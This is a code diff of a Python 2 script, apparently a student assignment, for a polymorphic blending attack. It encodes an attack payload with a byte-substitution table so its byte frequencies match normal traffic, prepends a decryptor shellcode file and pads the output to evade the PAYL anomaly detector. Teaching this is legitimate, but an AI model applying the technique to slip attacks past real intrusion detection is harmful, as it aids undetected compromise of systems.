@@ -1,93 +1,52 @@
 #!/usr/bin/env python2
 import struct
-import math
-import dpkt
-import socket
 from collections import Counter
-from frequency import *
-import pandas as pd
+from substitution import *
+from padding import *
 
-def substitute(attack_payload, subsitution_table):
-    # Using the substitution table you generated to encrypt attack payload
-    # Note that you also need to generate a xor_table which will be used to decrypt the attack_payload
-    # i.e. (encrypted attack payload) XOR (xor_table) = (original attack payload)
-    b_attack_payload = bytearray(attack_payload)
-    result = []
-    xor_table = []
-    # Based on your implementattion of substitution table, please prepare result and xor_table as output
+ARTIFICIAL_PATH = "artificial-profile.pcap"
+ATTACKBODY_PATH = "tzhi3.pcap" # replace the file name by the one you downloaded
 
-    return (xor_table, result)
-
-def findFrequency(character,lst):
-    output = 'NOTHING'
-    for item in lst:
-        if character ==  item[0]:
-            output = item[1]
-    return output
-
-def getNormalMapping(substitution_table,sorted_attack_frequency):
-        substitution_table = pd.DataFrame(substitution_table,columns=['Attack Char','Normal Char','Normal Frequency'])
-        #print(substitution_table)
-        grouped =  substitution_table.groupby(['Attack Char'])['Normal Frequency'].sum()
-        ratios = pd.Series(index=grouped.index.values)
-        for char in grouped.index.values:
-            ratios.loc[char] = findFrequency(char,sorted_attack_frequency)/grouped.loc[char]
-        print(grouped.sort_values(ascending=False))
-        sorted_ratios = ratios.sort_values(ascending=False)
-        print(sorted_ratios)
-        return sorted_ratios
+if __name__ == '__main__':
+	# Read in source pcap file and extract tcp payload
+	attack_payload = getAttackBodyPayload(ATTACKBODY_PATH)
+	artificial_payload = getArtificialPayload(ARTIFICIAL_PATH)
 
 
-def getSubstitutionTable(artificial_payload, attack_payload):
-    # You will need to generate a substitution table which can be used to encrypt the attack body by replacing the most frequent byte in attack body by the most frequent byte in artificial profile one by one
+	# Generate substitution table based on byte frequency in file
+	substitution_table = getSubstitutionTable(artificial_payload, attack_payload)
 
-    # Note that the frequency for each byte is provided below in dictionay format. Please check frequency.py for more details
-    artificial_frequency = frequency(artificial_payload)
-    attack_frequency = frequency(attack_payload)
-
-    sorted_artificial_frequency = sorting(artificial_frequency)
-    sorted_attack_frequency = sorting(attack_frequency)
-
-    # Your code here ...
-    substitution_table = []
-    for i in range(0,len(sorted_attack_frequency)):
-        line = [sorted_attack_frequency[i][0],sorted_artificial_frequency[i][0],sorted_artificial_frequency[i][1]]
-        #print(line)
-        substitution_table.append(line)
-
-    #substitution_table.append(['a','o',1])
-
-    x_char = sorted_artificial_frequency[len(sorted_attack_frequency)][0]
-    print(n_char)
-
-    sorted_ratios = getNormalMapping(substitution_table,sorted_attack_frequency)
-    y_char ='d'
-    x_char_freq =0.2
-    line = [y_char, x_char, x_char_freq]
-
-    # You may implement substitution table in your way. Just make sure it can be used in substitute(attack_payload, subsitution_table)
-
-    #return substitution_table
+	# Substitution table will be used to encrypt attack body and generate corresponding xor_table which will be used to decrypt the attack body
+	(xor_table, adjusted_attack_body) = substitute(attack_payload, substitution_table)
 
 
-def getAttackBodyPayload(path):
-    f = open(path)
-    pcap = dpkt.pcap.Reader(f)
-    for ts, buf in pcap:
-        eth = dpkt.ethernet.Ethernet(buf)
-        ip = eth.data
-        if socket.inet_ntoa(ip.dst) == "192.150.11.111": # verify the dst IP from your attack payload
-            tcp = ip.data
-            if tcp.data == "":
-                continue
-            return tcp.data.rstrip()
 
-def getArtificialPayload(path):
-    f = open(path)
-    pcap = dpkt.pcap.Reader(f)
-    for ts, buf in pcap:
-        eth = dpkt.ethernet.Ethernet(buf)
-        ip = eth.data
-        tcp = ip.data
-        if tcp.sport == 80 and len(tcp.data) > 0:
-            return tcp.data
+	if len(attack_payload) <127:
+		attack_payload=attack_payload.ljust(127,chr(0));
+		
+	# For xor operation, so supply to a multiple of 4
+
+	while len(xor_table) < 132:
+		xor_table.append(chr(0))
+
+	# For xor operation, should be a multiple of 4
+	while len(adjusted_attack_body) < 124: # CHECK: 124 can be some other number (multiple of 4) per your attack trace length
+		adjusted_attack_body.append(chr(0))
+
+	# Read in decryptor binary to append at the start of payload
+	with open("shellcode.bin", mode='rb') as file:
+		shellcode_content = file.read()
+
+    # Prepare byte list for payload
+	b_list = []
+	for b in shellcode_content:
+		b_list.append(b)
+
+	# Raw payload will be constructed by encrypted attack body and xor_table
+	raw_payload = b_list + adjusted_attack_body + xor_table
+	while len(raw_payload) < len(artificial_payload):
+		padding(artificial_payload, raw_payload)
+
+	# Write prepared payload to Output file and test against your PAYL model
+	with open("output", "w") as result_file:
+		result_file.write(''.join(raw_payload))
